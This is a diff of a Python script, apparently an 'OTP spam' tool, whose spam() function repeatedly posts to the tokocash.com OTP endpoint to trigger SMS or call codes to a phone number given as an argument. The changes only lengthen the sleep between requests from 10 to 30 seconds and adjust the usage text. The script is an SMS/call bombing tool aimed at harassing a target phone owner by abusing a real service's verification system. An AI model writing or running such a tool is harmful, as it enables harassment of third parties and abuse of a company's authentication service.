@@ -25,10 +25,10 @@ def spam():
 		while (count < 2):
 			r = requests.post('https://www.tokocash.com/oauth/otp', data=param)
 			if "otp_attempt_left" in r.text:
-				print("\033[1;32m[  OK  ] Send Succesful...Sleep for 10 second...\033[0m")
+				print("\033[1;32m[  OK  ] Send Succesful...Sleep for 30 second...\033[0m")
 			else:
-				print("\033[1;31m[FAILED] Send Failed...Sleep for 10 second...\033[0m")
-			time.sleep(10)
+				print("\033[1;31m[FAILED] Send Failed...Sleep for 30 second...\033[0m")
+			time.sleep(30)
 			count = count + 1
 		print("\033[1;33m[ DONE ] Stopped...\033[0m")
 		sys.exit(1)
@@ -39,16 +39,16 @@ def spam():
 		while (count < 3):
 			r = requests.post('https://www.tokocash.com/oauth/otp', data=param)
 			if "otp_attempt_left" in r.text:
-				print("\033[1;32m[  OK  ] Send Succesful...Sleep for 10 second...\033[0m")
+				print("\033[1;32m[  OK  ] Send Succesful...Sleep for 30 second...\033[0m")
 			else:
-				print("\033[1;31m[FAILED] Send Failed...Sleep for 10 second...\033[0m")
-			time.sleep(10)
+				print("\033[1;31m[FAILED] Send Failed...Sleep for 30 second...\033[0m")
+			time.sleep(30)
 			count = count + 1
 		print("\033[1;33m[ DONE ] Stopped...")
 		sys.exit(1)
 	else:
 		print __banner__
-		print "Usage: Tpedia.py [--sms/--call] PHONE"
+		print "Usage: tpedia.py [--sms/--call] PHONE"
 		print "lite.py: error: %s option requires an argument" %options
 		sys.exit()
 
